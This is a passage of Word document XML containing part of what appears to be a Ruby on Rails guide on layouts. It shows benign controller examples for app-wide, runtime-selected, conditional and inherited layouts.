        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To assign a specific layout for the entire application, use a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>layout</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> declaration in your </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ApplicationController</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6168"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="6F342248" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="12BB3507" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ApplicationController &lt; ActionController::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="32EDFE9F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  layout "main"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F4DF2A0" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  #...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C61CE4D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3E141AD8" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">With this declaration, all of the views in the entire application will use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app/views/layouts/main.html.erb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for their layout.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24569F85" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t>2.2.12.2 Choosing Layouts at Runtime</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A327CFF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You can use a symbol to defer the choice of layout until a request is processed:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7008"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="2E51F40C" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6DF207A5" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ProductsController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="791C29F1" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  layout :products_layout</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4881FD0F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3DD601B0" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>show</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="560BA397" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    @product</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= Product.find(params[:id])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="178FABDA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7DC0956B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60313829" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  private</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5B445456" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>products_layout</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6764401B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      @current_user.special? ? "special"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>: "products"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0BFC35FC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="65AFC6C8" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2369D660" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="190C3BAA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Now, if the current user is a special user, they’ll get a special layout when viewing a product.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0559B14B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can even use an inline method, such as a Proc, to determine the layout. For example, if you pass a Proc object, the block you give the Proc will be given the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>controller</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> instance, so the layout can be determined based on the current request:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="18656673" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5CF33720" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ProductsController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7996BF42" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  layout Proc.new</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>{ |controller| controller.request.xhr? ? 'popup'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>: 'application'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="273431C0" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0517F923" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t>2.2.12.3 Conditional Layouts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03BD5F67" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Layouts specified at the controller level support the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:only</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:except</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> options. These options take either a method name, or an array of method names, corresponding to method names within the controller:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5688"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="47C2C653" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1301A1ED" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ProductsController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="40ADBAB8" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  layout "product", :except</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; [:index, :rss]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="63E0F278" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="163F4B1A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">With this declaration, the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>product</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> layout would be used for everything but the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rss</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>index</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> methods.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1530DBF8" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t>2.2.12.4 Layout Inheritance</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E73836D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Layout declarations cascade downward in the hierarchy, and more specific layout declarations always override more general ones. For example:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0085A745" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="65"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>application_controller.rb</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6168"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="22BDA2C9" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="226EBE29" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ApplicationController &lt; ActionController::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D81F84D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  layout "main"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E1F52F0" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="601AAFDE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="66"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>posts_controller.rb</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5328"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="428CEB5B" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7AD9AFFC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>PostsController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C415CAC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="332DD6BB" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="67"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>special_posts_controller.rb</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5448"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="12A45E7A" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="00938127" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>SpecialPostsController &lt; PostsController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35CE7801" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  layout "special"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4CDE991A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="46C9349A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="68"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>old_posts_controller.rb</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5808"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="7C4DE804" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2FF3E052" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>OldPostsController &lt; SpecialPostsController</w:t>
            </w:r>
          </w:p>
